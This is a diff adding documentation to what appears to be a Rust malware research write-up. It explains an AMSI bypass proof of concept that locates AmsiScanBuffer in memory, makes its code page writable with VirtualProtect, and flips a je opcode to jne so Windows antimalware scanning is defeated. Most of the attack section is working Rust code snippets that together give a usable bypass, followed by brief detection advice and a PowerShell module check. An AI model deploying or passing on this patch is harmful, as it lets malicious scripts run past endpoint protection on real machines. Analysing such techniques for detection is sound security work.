@@ -95,6 +95,127 @@ Rust malware commonly targets AMSI because bypassing it enables:
 
 ---
 
+## AMSI Bypass PoC Mechanism
+
+This is a **runtime AMSI (Antimalware Scan Interface) bypass** using bytecode patching to disable Windows antimalware scanning. Here's how it works:
+
+### Attack Overview
+
+The exploit targets **AmsiScanBuffer**, the core Windows function that antivirus engines hook to scan suspicious code before execution. By patching a critical conditional branch within this function, the code forces a controlled execution path that bypasses the actual malware scanning logic.
+
+### Step-by-Step Breakdown
+
+**1. Load AMSI.dll and Locate AmsiScanBuffer**
+
+```rust
+let h_module = LoadLibraryA(s!("AMSI"))?;
+let address = GetProcAddress(h_module, PCSTR(name.as_ptr().cast()))
+    .ok_or_else(|| Error::from_win32())? as *const u8;
+```
+
+The code dynamically loads the `AMSI.dll` library and retrieves the memory address of the `AmsiScanBuffer` function. This is the function that Windows calls whenever potentially malicious code (PowerShell scripts, VBScript, JScript, etc.) needs to be scanned.
+
+**2. Pattern Search for Function Landmarks**
+
+```rust
+let pattern = [0xC3, 0xCC, 0xCC];  // ret + int3 + int3
+let bytes = from_raw_parts(address as *const u8, 0x1000 as usize);
+
+if let Some(x) = bytes.windows(pattern.len()).position(|window| window == pattern) {
+    // Pattern found
+}
+```
+
+The code searches for a signature pattern within the first 4096 bytes of the function:
+
+- `0xC3` = `ret` (function return)
+- `0xCC 0xCC` = `int3 int3` (debugging breakpoints/padding)
+
+This pattern marks a typical function epilogue and helps establish a **known reference point** within the binary to normalize the search across different Windows versions (since AMSI.dll may differ).
+
+**3. Reverse Scan for Conditional Jump**
+
+```rust
+for i in (0..x).rev() {
+    if bytes[i] == 0x74 {
+        let offset = bytes.get(i + 1).copied().unwrap_or(0);
+        let target_index = i.wrapping_add(2).wrapping_add(offset as usize);
+        
+        if bytes.get(target_index) == Some(&0xB8) {
+            p_patch_address = (address.add(i)) as *mut c_void;
+            break;
+        }
+    }
+}
+```
+
+Scanning **backwards** from the known pattern, it searches for a `0x74` opcode—the **je (jump if equal)** instruction. This is the critical conditional branch that determines whether AMSI performs the actual scan:
+
+- `0x74` = `je` (jump if zero flag set)
+- The instruction is followed by a 1-byte relative offset
+- The code calculates where the jump targets: `target_index = i + 2 + offset`
+- It validates that the **jump target** begins with `0xB8` (`mov eax, imm32`), which is typically part of the "scan passed" code path
+
+**4. Memory Protection Bypass**
+
+```rust
+let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+VirtualProtect(p_patch_address, 1, PAGE_EXECUTE_READWRITE, &mut old_protect)?;
+```
+
+The function memory is **read-only** by default. `VirtualProtect` changes the protection from `PAGE_EXECUTE_READ` (or similar) to `PAGE_EXECUTE_READWRITE`, allowing modification.
+
+**5. Bytecode Patch**
+
+```rust
+let patch_opcode = 0x75u8;  // jne (jump if not equal)
+*(p_patch_address as *mut u8) = patch_opcode;
+```
+
+The critical operation: **replace `0x74` (je) with `0x75` (jne)**. Both instructions are single bytes and differ only in the last bit.
+
+- **Original**: `je` — Jump if equal (scan performed, potential threat detected → block)
+- **Patched**: `jne` — Jump if **not** equal (reverse the logic)
+
+This **inverts the conditional** so that the jump target (the benign code path) is taken when it shouldn't be, forcing a bypass.
+
+**6. Restore Memory Protection**
+
+```rust
+VirtualProtect(p_patch_address, 1, old_protect, &mut old_protect)?;
+```
+
+Restores original protection to avoid detection via memory scanning.
+
+### Why This Works
+
+The exploit assumes `AmsiScanBuffer` follows a common pattern:
+
+```
+; Check if threat detected
+... scanning logic ...
+je BENIGN_PATH          ; 0x74 - Jump if scan says "clean"
+jmp BLOCKED_PATH        ; Otherwise block execution
+BENIGN_PATH:
+mov eax, 0              ; Return success code
+ret
+```
+
+By inverting the jump, any code that should be blocked will instead execute. The patching is **version-agnostic** within a Windows release because it uses the pattern-matching approach rather than hardcoded offsets.
+
+### Key Technical Insights for Your Research
+
+This technique demonstrates several malware analysis concepts relevant to your Rust binary research:
+
+- **Opcode-level mutation**: A single-byte patch (0x74 → 0x75) creates semantic changes
+- **Pattern matching for ASLR**: Signature-based location finding bypasses address randomization
+- **Memory protection manipulation**: Direct syscall abuse via `VirtualProtect`
+- **Backwards scanning heuristics**: Reverse-scanning to find critical code structures
+
+From a detection perspective, this is a good case study for your Rust malware analysis work—behavioral signatures (memory modification + AMSI.dll hooking) are more reliable than static analysis for catching such patches.
+
+---
+
 # Analysis of the code
 
 ## Summary of this code
@@ -129,6 +250,16 @@ This code implements an **AMSI (Antimalware Scan Interface) bypass** by patching
    - Maintains stealth by leaving memory permissions in expected state
 
 **Security Context**: This technique is commonly used in offensive security to bypass endpoint detection. The code demonstrates advanced Windows internals knowledge, including function prologue analysis, runtime patching, and memory protection manipulation.
+
+---
+
+# Check Before / After
+
+## Check AMSI Service Status
+
+```powershell
+[System.Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object {$_.ModuleName -like "*amsi*"}
+```
 
 ---
 
